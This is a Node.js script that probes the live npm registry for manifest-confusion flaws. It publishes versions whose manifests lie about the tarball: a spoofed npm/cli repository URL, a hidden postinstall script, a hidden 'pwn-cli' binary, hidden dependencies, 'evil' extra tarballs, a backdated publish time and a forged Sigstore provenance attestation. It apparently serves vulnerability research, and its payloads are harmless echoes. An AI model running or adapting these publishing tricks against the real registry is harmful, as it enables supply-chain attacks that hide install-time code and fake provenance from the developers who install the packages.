#!/usr/bin/env node
// Manifest-vs-tarball divergence and attestation injection probes.
//
// Tests whether the registry validates / overrides / stores-verbatim several fields
// where the publisher's manifest body can disagree with the tarball's contents.
//
// Probes:
//   A — repository URL spoofing (claim github.com/npm/cli)
//   B — scripts divergence (manifest claims none, tarball has postinstall)
//   C — bin divergence (manifest claims none, tarball has bin entry)
//   D — dependencies divergence (manifest claims none, tarball has deps)
//   E — _attachments with mismatched name (key != <pkg>-<version>.tgz)
//   F — _attachments with extra second tarball under a different name
//   G — time field injection
//   H — attestations field injection (publisher-supplied Sigstore-shaped block)

import crypto from 'node:crypto'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { execSync } from 'node:child_process'

const REGISTRY = 'https://registry.npmjs.org'
const PKG = 'ghostpublish'
const TS = Math.floor(Date.now() / 1000)

function readToken() {
  for (const p of [path.resolve('.npmrc'), path.join(os.homedir(), '.npmrc')]) {
    try {
      const text = fs.readFileSync(p, 'utf8')
      const m = text.match(/_authToken=([A-Za-z0-9_-]+)/)
      if (m) return m[1].trim()
    } catch {}
  }
  throw new Error('No npm auth token found')
}
const token = readToken()

function buildTarball(version, packageJsonExtras = {}, extraFiles = {}) {
  const stagingDir = fs.mkdtempSync(path.join(os.tmpdir(), 'gh-divprobe-'))
  const pkgDir = path.join(stagingDir, 'package')
  fs.mkdirSync(pkgDir)
  const pjson = {
    name: PKG,
    version,
    license: 'MIT',
    main: 'index.js',
    ...packageJsonExtras,
  }
  fs.writeFileSync(path.join(pkgDir, 'package.json'), JSON.stringify(pjson, null, 2))
  fs.writeFileSync(path.join(pkgDir, 'index.js'), `module.exports = { ts: ${TS} };\n`)
  for (const [name, content] of Object.entries(extraFiles)) {
    fs.writeFileSync(path.join(pkgDir, name), content)
  }
  const tarballPath = path.join(stagingDir, `${PKG}-${version}.tgz`)
  execSync(`tar --no-xattrs --format=ustar -czf "${tarballPath}" -C "${stagingDir}" package`, { stdio: 'inherit' })
  const buf = fs.readFileSync(tarballPath)
  return {
    buf,
    sha1: crypto.createHash('sha1').update(buf).digest('hex'),
    integrity: `sha512-${crypto.createHash('sha512').update(buf).digest('base64')}`,
  }
}

async function publishCustom(version, body) {
  const t0 = Date.now()
  const res = await fetch(`${REGISTRY}/${PKG}`, {
    method: 'PUT',
    headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json', accept: '*/*' },
    body: JSON.stringify(body),
  })
  const text = await res.text()
  return { version, res, text, elapsed: Date.now() - t0 }
}

async function readManifest(version) {
  const r = await fetch(`${REGISTRY}/${PKG}/${version}`, { headers: { accept: 'application/json' } })
  if (!r.ok) return { ok: false, status: r.status, body: await r.text() }
  return { ok: true, manifest: await r.json() }
}

const REPORT = []
function record(probe, sentSummary, storedSummary, verdict, putStatus) {
  REPORT.push({ probe, sentSummary, storedSummary, verdict, putStatus })
}
function logHeader(t) { console.log('\n' + '='.repeat(72) + '\n' + t + '\n' + '='.repeat(72)) }
function sleep(ms) { return new Promise((r) => setTimeout(r, ms)) }

// ---- Probe A: repository URL spoofing ----
{
  logHeader('PROBE A — repository URL spoofing')
  const version = `1.0.0-divprobe-repo-${TS}`
  const { buf, sha1, integrity } = buildTarball(version, {
    repository: { type: 'git', url: 'https://github.com/REAL_TARBALL_REPO.git' },
  })
  const tgzName = `${PKG}-${version}.tgz`
  const body = {
    _id: PKG, name: PKG, description: 'repository spoof probe',
    'dist-tags': { 'divprobe-repo': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        repository: { type: 'git', url: 'https://github.com/npm/cli.git' },     // <-- LIE
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: { [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(version)
  if (m.ok) {
    console.log(`  manifest.repository: ${JSON.stringify(m.manifest.repository)}`)
    const stored = m.manifest.repository
    const verdict = stored?.url?.includes('npm/cli') ? '*** SPOOFED — manifest claims npm/cli, tarball was different ***'
      : stored?.url?.includes('REAL_TARBALL_REPO') ? 'OVERRIDDEN with tarball value'
      : 'OTHER'
    record('repository URL spoof', 'manifest=npm/cli, tarball=REAL_TARBALL_REPO', JSON.stringify(stored), verdict, out.res.status)
  } else {
    record('repository URL spoof', 'spoof', '<error>', `READ FAILED: ${m.status}`, out.res.status)
  }
}

// ---- Probe B: scripts divergence ----
{
  logHeader('PROBE B — scripts divergence (manifest claims none, tarball has postinstall)')
  const version = `1.0.0-divprobe-scripts-${TS}`
  const { buf, sha1, integrity } = buildTarball(version, {
    scripts: { postinstall: 'echo PROBE_FAKE_POSTINSTALL_in_tarball' },
  })
  const tgzName = `${PKG}-${version}.tgz`
  const body = {
    _id: PKG, name: PKG, description: 'scripts divergence probe',
    'dist-tags': { 'divprobe-scripts': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        scripts: {},                                                              // <-- LIE
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: { [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(version)
  if (m.ok) {
    console.log(`  manifest.scripts: ${JSON.stringify(m.manifest.scripts)}`)
    const stored = m.manifest.scripts
    const verdict = stored?.postinstall ? 'OVERRIDDEN — manifest reflects tarball'
      : Object.keys(stored || {}).length === 0 ? '*** ACCEPTED — manifest hides postinstall, scanners misled ***'
      : 'OTHER'
    record('scripts divergence', 'manifest={}, tarball.postinstall=...', JSON.stringify(stored), verdict, out.res.status)
  } else {
    record('scripts divergence', 'div', '<error>', `READ FAILED: ${m.status}`, out.res.status)
  }
}

// ---- Probe C: bin divergence ----
{
  logHeader('PROBE C — bin divergence')
  const version = `1.0.0-divprobe-bin-${TS}`
  const { buf, sha1, integrity } = buildTarball(version, {
    bin: { 'pwn-cli': './pwn.js' },
  }, { 'pwn.js': '#!/usr/bin/env node\nconsole.log("pwned");\n' })
  const tgzName = `${PKG}-${version}.tgz`
  const body = {
    _id: PKG, name: PKG, description: 'bin divergence probe',
    'dist-tags': { 'divprobe-bin': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        // No bin in manifest                                                      <-- LIE
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: { [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(version)
  if (m.ok) {
    console.log(`  manifest.bin: ${JSON.stringify(m.manifest.bin)}`)
    const verdict = m.manifest.bin ? 'OVERRIDDEN — registry pulled bin from tarball' : '*** ACCEPTED — manifest hides bin entries ***'
    record('bin divergence', 'manifest:absent, tarball.bin={pwn-cli:./pwn.js}', JSON.stringify(m.manifest.bin || '<absent>'), verdict, out.res.status)
  } else {
    record('bin divergence', 'div', '<error>', `READ FAILED: ${m.status}`, out.res.status)
  }
}

// ---- Probe D: dependencies divergence ----
{
  logHeader('PROBE D — dependencies divergence')
  const version = `1.0.0-divprobe-deps-${TS}`
  const { buf, sha1, integrity } = buildTarball(version, {
    dependencies: { lodash: '^4.17.21', 'left-pad': '1.3.0' },
  })
  const tgzName = `${PKG}-${version}.tgz`
  const body = {
    _id: PKG, name: PKG, description: 'deps divergence probe',
    'dist-tags': { 'divprobe-deps': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        dependencies: {},                                                         // <-- LIE
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: { [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  const m = await readManifest(version)
  if (m.ok) {
    console.log(`  manifest.dependencies: ${JSON.stringify(m.manifest.dependencies)}`)
    const stored = m.manifest.dependencies
    const verdict = stored?.lodash ? 'OVERRIDDEN — registry pulled deps from tarball'
      : !stored || Object.keys(stored).length === 0 ? '*** ACCEPTED — manifest hides deps; resolvers misled ***'
      : 'OTHER'
    record('dependencies divergence', 'manifest={}, tarball.deps={lodash,left-pad}', JSON.stringify(stored), verdict, out.res.status)
  } else {
    record('dependencies divergence', 'div', '<error>', `READ FAILED: ${m.status}`, out.res.status)
  }
}

// ---- Probe E: _attachments with mismatched name ----
{
  logHeader('PROBE E — _attachments with mismatched filename (evil.tgz instead of pkg-v.tgz)')
  const version = `1.0.0-divprobe-attname-${TS}`
  const { buf, sha1, integrity } = buildTarball(version)
  const wrongName = 'evil.tgz'
  const body = {
    _id: PKG, name: PKG, description: 'attachment name probe',
    'dist-tags': { 'divprobe-attname': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        dist: { tarball: `${REGISTRY}/${PKG}/-/${PKG}-${version}.tgz`, shasum: sha1, integrity },
      },
    },
    _attachments: { [wrongName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  record('_attachments wrong name', 'key=evil.tgz', '', out.res.status === 200 ? '*** ACCEPTED ***' : `REJECTED ${out.res.status}`, out.res.status)
}

// ---- Probe F: _attachments with two tarballs ----
{
  logHeader('PROBE F — _attachments with TWO tarballs (extra under different name)')
  const version = `1.0.0-divprobe-twoatt-${TS}`
  const { buf, sha1, integrity } = buildTarball(version)
  const evilVersion = `9.9.9-divprobe-evil-${TS}`
  const evil = buildTarball(evilVersion, { description: 'EVIL TARBALL extra' })
  const tgzName = `${PKG}-${version}.tgz`
  const evilTgzName = `${PKG}-${evilVersion}.tgz`
  const body = {
    _id: PKG, name: PKG, description: 'two-attachments probe',
    'dist-tags': { 'divprobe-twoatt': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: {
      [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length },
      [evilTgzName]: { content_type: 'application/octet-stream', data: evil.buf.toString('base64'), length: evil.buf.length },
    },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  // Try fetching the unmentioned tarball at its canonical URL
  const evilUrl = `${REGISTRY}/${PKG}/-/${evilTgzName}`
  const evilHead = await fetch(evilUrl, { method: 'HEAD' })
  console.log(`  HEAD ${evilUrl}: ${evilHead.status}`)
  // Also see if the evil version got created
  const evilManifest = await readManifest(evilVersion)
  console.log(`  GET ${REGISTRY}/${PKG}/${evilVersion}: ${evilManifest.ok ? 'EXISTS' : `MISSING (${evilManifest.status})`}`)
  const verdict = evilHead.status === 200 ? '*** EVIL TARBALL CDN-ACCESSIBLE ***'
    : evilManifest.ok ? '*** EVIL VERSION CREATED ***'
    : 'extra tarball ignored'
  record('_attachments two tarballs', 'real + evil-9.9.9', `evil HEAD=${evilHead.status}`, verdict, out.res.status)
}

// ---- Probe G: time field injection ----
{
  logHeader('PROBE G — top-level time field injection')
  const version = `1.0.0-divprobe-time-${TS}`
  const { buf, sha1, integrity } = buildTarball(version)
  const tgzName = `${PKG}-${version}.tgz`
  const body = {
    _id: PKG, name: PKG, description: 'time injection probe',
    'dist-tags': { 'divprobe-time': version },
    time: { [version]: '2010-01-01T00:00:00.000Z' },                              // <-- LIE
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: { [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  // Read top-level packument to check time field
  const pr = await fetch(`${REGISTRY}/${PKG}`, { headers: { accept: 'application/json' } })
  const packument = await pr.json()
  const stored = packument.time?.[version]
  console.log(`  packument.time["${version}"]: ${stored}`)
  const verdict = stored === '2010-01-01T00:00:00.000Z' ? '*** ANTEDATING ACCEPTED ***'
    : stored ? `OVERRIDDEN with ${stored}`
    : 'NO TIME ENTRY'
  record('time field injection', `${version}=2010-01-01`, stored || '<absent>', verdict, out.res.status)
}

// ---- Probe H: attestations field injection (the provenance question) ----
{
  logHeader('PROBE H — attestations field injection (publisher-supplied Sigstore-shaped block)')
  const version = `1.0.0-divprobe-attest-${TS}`
  const { buf, sha1, integrity } = buildTarball(version)
  const tgzName = `${PKG}-${version}.tgz`
  // Sigstore-bundle-shaped fake attestation
  const fakeAttestation = {
    predicateType: 'https://slsa.dev/provenance/v1',
    bundle: {
      mediaType: 'application/vnd.dev.sigstore.bundle.v0.3+json',
      verificationMaterial: {
        x509CertificateChain: { certificates: [{ rawBytes: 'PROBE_FAKE_CERT_AAA=' }] },
        tlogEntries: [{ logIndex: '999999999', integratedTime: '0', kindVersion: { kind: 'intoto', version: '0.0.2' } }],
      },
      dsseEnvelope: {
        payload: Buffer.from(JSON.stringify({
          _type: 'https://in-toto.io/Statement/v1',
          subject: [{ name: `pkg:npm/${PKG}@${version}`, digest: { sha512: 'AAAAAAA' } }],
          predicateType: 'https://slsa.dev/provenance/v1',
          predicate: { buildDefinition: { buildType: 'PROBE_FAKE' } },
        })).toString('base64'),
        payloadType: 'application/vnd.in-toto+json',
        signatures: [{ keyid: '', sig: 'PROBE_FAKE_SIG_AAAAAAA=' }],
      },
    },
  }
  const body = {
    _id: PKG, name: PKG, description: 'attestations injection probe',
    'dist-tags': { 'divprobe-attest': version },
    versions: {
      [version]: {
        name: PKG, version, license: 'MIT', main: 'index.js', _id: `${PKG}@${version}`,
        dist: { tarball: `${REGISTRY}/${PKG}/-/${tgzName}`, shasum: sha1, integrity },
      },
    },
    _attachments: { [tgzName]: { content_type: 'application/octet-stream', data: buf.toString('base64'), length: buf.length } },
    attestations: [fakeAttestation],                                              // <-- INJECTION
  }
  const out = await publishCustom(version, body)
  console.log(`PUT HTTP ${out.res.status} (${out.elapsed} ms): ${out.text.slice(0, 200)}`)
  await sleep(2000)
  // Check attestations endpoint
  const aurl = `${REGISTRY}/-/npm/v1/attestations/${PKG}@${version}`
  const ar = await fetch(aurl, { headers: { accept: 'application/json' } })
  console.log(`  GET ${aurl}: HTTP ${ar.status}`)
  let attestData = '<not retrieved>'
  if (ar.ok) {
    attestData = await ar.text()
    console.log(`  body (first 400): ${attestData.slice(0, 400)}`)
  } else {
    attestData = `HTTP ${ar.status}`
  }
  const m = await readManifest(version)
  const versionAttest = m.ok ? m.manifest.dist?.attestations || m.manifest.attestations || '<absent>' : '<read err>'
  console.log(`  manifest.dist.attestations: ${JSON.stringify(versionAttest).slice(0, 200)}`)
  const verdict = ar.ok && attestData.includes('PROBE_FAKE') ? '*** ACCEPTED — fake attestation served by registry ***'
    : ar.status === 404 ? 'attestation NOT registered (fake stripped or never accepted)'
    : 'OTHER'
  record('attestations field injection', 'fake Sigstore bundle', `attestations endpoint: ${attestData.slice(0, 80)}`, verdict, out.res.status)
}

// ---- Summary ----
logHeader('SUMMARY')
console.log()
console.log('| Probe                                | PUT  | Verdict |')
console.log('|--------------------------------------|------|---------|')
for (const r of REPORT) {
  console.log(`| ${r.probe.padEnd(36)} | ${String(r.putStatus).padEnd(4)} | ${r.verdict} |`)
}
console.log()
console.log('Detail:')
for (const r of REPORT) {
  console.log(`  [${r.probe}]`)
  console.log(`    sent:   ${r.sentSummary}`)
  console.log(`    stored: ${r.storedSummary}`)
}
